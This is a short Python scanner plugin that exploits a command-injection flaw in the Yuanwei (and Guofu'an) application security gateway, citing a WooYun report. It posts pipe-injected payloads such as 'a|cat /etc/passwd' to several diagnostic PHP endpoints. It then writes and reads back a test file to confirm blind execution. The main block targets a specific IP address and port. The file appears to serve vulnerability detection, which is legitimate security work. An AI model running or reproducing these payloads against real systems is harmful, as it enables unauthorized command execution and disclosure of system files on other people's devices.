#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 远为应用安全网关(&国富安应用安全网关)命令执行
refer: http://www.wooyun.org/bugs/wooyun-2015-0130878
description:
    
'''

import re

def assign(service, arg):
    if service == 'yuanwei_gateway':
        return True, arg

def audit(arg):
    content_type = 'Content-Type: application/x-www-form-urlencoded'
    urls = [
        arg + 'tools/fault/sys_ping.php',
        arg + 'tools/fault/sys_nslookup.php',
        arg + 'tools/fault/sys_webpacket.php'
    ]
    posts = [
        'name=a|cat%20%2Fetc%2Fpasswd*wtf*4',
        'name=a|cat%20/etc/passwd',
        'name=a|cat%20/etc/passwd',
    ]
    for i in range(len(urls)):
        url = urls[i]
        post = posts[i]
        code, head, res, err, _ = curl.curl2(url, post, header=content_type)
        if(code == 200) and ('root:' in res):
            security_hole('Command execution: ' + url + 'POST: ' +post)
    #无回显
    url  = arg + 'tools/fault/arp.php'
    post = 'str=a|echo%20testvul>test.txt'
    code, head, res, err, _ = curl.curl2(url, post=post)
    if (code == 200):
        code, head, res, err, _ = curl.curl2(arg + 'tools/fault/test.txt')
        if(code == 200) and ('testvul' in res):
            security_hole('Command execution: ' + url + 'POST: ' +post)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('yuanwei_gateway','http://222.170.47.230:8888/')[1])